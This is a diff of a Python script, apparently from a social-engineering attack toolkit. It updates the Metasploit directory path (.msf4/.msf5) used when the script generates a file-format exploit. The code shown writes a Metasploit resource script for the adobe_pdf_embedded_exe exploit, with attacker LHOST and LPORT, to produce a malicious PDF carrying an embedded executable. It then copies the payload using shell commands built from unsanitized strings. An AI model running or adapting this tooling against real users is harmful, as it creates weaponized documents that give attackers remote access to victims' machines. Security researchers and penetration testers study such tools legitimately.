@@ -162,15 +162,21 @@ if exploit_counter == 0:
     # SET FILE OUTPATH
     # /root/.msf4/local/msf.pdf
     filename_code = outfile
-    outpath=(users_home + "/.msf4/local/" + outfile)
+    if os.path.isdir(users_home + "/.msf4/"):
+	msfpath = (users_home + "/.msf4/")
+
+    if os.path.isdir(users_home + "/.msf5/"):
+	msfpath = (users_home + "/.msf5/")
+
+    outpath=(msfpath + "local/" + outfile)
     print_info("Generating fileformat exploit...")
     # START THE EXE TO VBA PAYLOAD
     if exploit != 'custom/exe/to/vba/payload':
         output = setdir + "/%s" % (outfile)
 	if os.path.isfile(setdir + "/template.pdf"):
 		os.remove(setdir + "/template.pdf")
-	if os.path.isfile(users_home + "/.msf4/local/template.pdf"):
-		os.remove(users_home + "/.msf4/local/template.pdf")
+	if os.path.isfile(msfpath + "local/template.pdf"):
+		os.remove(msfpath + "local/template.pdf")
 
 	filewrite = file(setdir + "/template.rc", "w")
 	filewrite.write("use exploit/windows/fileformat/adobe_pdf_embedded_exe\nset LHOST %s\nset LPORT %s\nset INFILENAME %s\nset FILENAME %s\nexploit\n" % (rhost,lport,inputpdf,output))
@@ -179,12 +185,12 @@ if exploit_counter == 0:
 	a = 1
 	while a == 1:
 		if os.path.isfile(setdir + "/template.pdf"):
-		        subprocess.Popen("cp " + users_home + "/.msf4/local/%s %s" % (filename_code, setdir), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
+		        subprocess.Popen("cp " + msfpath + "local/%s %s" % (filename_code, setdir), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
 			a = 2 #break
 		else:
 			print_status("Waiting for payload generation to complete...")
-			if os.path.isfile(users_home + "/.msf4/local/" + outfile):
-				subprocess.Popen("cp %s/.msf4/local/%s %s" % (users_home, outfile,setdir), shell=True)
+			if os.path.isfile(msfpath + "local/" + outfile):
+				subprocess.Popen("cp %slocal/%s %s" % (msfpath, outfile,setdir), shell=True)
 			time.sleep(3)
 
         print_status("Payload creation complete.")
